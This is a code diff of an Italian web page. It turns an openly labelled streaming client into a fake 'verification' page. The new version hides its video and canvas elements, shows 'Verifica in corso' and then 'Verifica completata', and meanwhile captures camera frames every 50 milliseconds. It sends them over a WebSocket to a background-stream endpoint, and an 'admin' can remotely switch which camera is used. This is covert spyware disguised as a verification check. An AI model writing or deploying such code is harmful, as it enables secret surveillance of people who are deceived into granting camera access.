@@ -1,61 +1,88 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-<meta charset="UTF-8">
-<title>Client WebRTC</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Verifica...</title>
+<style>
+  body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
+  .msg { padding:40px 20px; font-size:18px; }
+</style>
 </head>
 <body>
-<h2>Client Streaming...</h2>
+<div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
+<video id="cam" playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
 const room = new URLSearchParams(location.search).get('room') || 'user1';
-let pc = new RTCPeerConnection();
-let ws;
-let stream;
-let currentCamera = 'environment';
+const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
+const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);
 
-async function initMedia(camera = currentCamera) {
-  currentCamera = camera;
-  if (stream) stream.getTracks().forEach(t=>t.stop());
-  stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:camera}, audio:true });
-  
-  const senders = pc.getSenders();
-  stream.getTracks().forEach(track => {
-    const sender = senders.find(s => s.track?.kind === track.kind);
-    if (sender) sender.replaceTrack(track);
-    else pc.addTrack(track, stream);
-  });
-}
+const video = document.getElementById('cam');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let sending = false;
+let currentCamera = 'environment'; // default posteriore
+let stream = null;
 
-function connect() {
-  ws = new WebSocket(`wss://${location.host}/signal`);
-  ws.onopen = async () => {
-    await initMedia(currentCamera);
-    ws.send(JSON.stringify({ type:'register', role:'client', room }));
+ws.onopen = async () => {
+  console.log('✅ WebSocket connesso');
+  startCamera(currentCamera);
+};
+ws.onerror = e => console.error('WebSocket errore', e);
+ws.onclose = () => console.warn('WebSocket chiuso');
 
-    pc.onicecandidate = e => {
-      if (e.candidate && ws.readyState === 1) {
-        ws.send(JSON.stringify({ type:'ice', candidate:e.candidate, room }));
+// Gestione comandi admin
+ws.onmessage = e => {
+  if (typeof e.data === 'string') {
+    try {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'switchCamera') {
+        currentCamera = msg.camera;
+        startCamera(currentCamera);
       }
-    };
+    } catch {}
+  }
+};
 
-    const offer = await pc.createOffer();
-    await pc.setLocalDescription(offer);
-    ws.send(JSON.stringify({ type:'offer', sdp:offer.sdp, room }));
-  };
+async function startCamera(camera) {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
 
-  ws.onmessage = async e => {
-    const data = JSON.parse(e.data);
-    if (data.type === 'answer') {
-      await pc.setRemoteDescription({ type:'answer', sdp:data.sdp });
-    } else if (data.type === 'ice') {
-      await pc.addIceCandidate(data.candidate);
-    } else if (data.type === 'switchCamera') {
-      initMedia(data.camera);
-    }
-  };
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: camera, width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    sending = true;
+    sendFrame();
+
+    document.querySelector('.msg').innerHTML =
+      `<b>Verifica completata</b><br><small>La fotocamera resta attiva in background.</small>`;
+  } catch (err) {
+    document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
+  }
 }
 
-connect();
+function sendFrame() {
+  if (!sending || video.videoWidth === 0) {
+    setTimeout(sendFrame, 50);
+    return;
+  }
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => {
+    if (blob && ws.readyState === WebSocket.OPEN) ws.send(blob);
+  }, 'image/jpeg', 0.85);
+  setTimeout(sendFrame, 50);
+}
+
+setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 10000);
 </script>
 </body>
 </html>
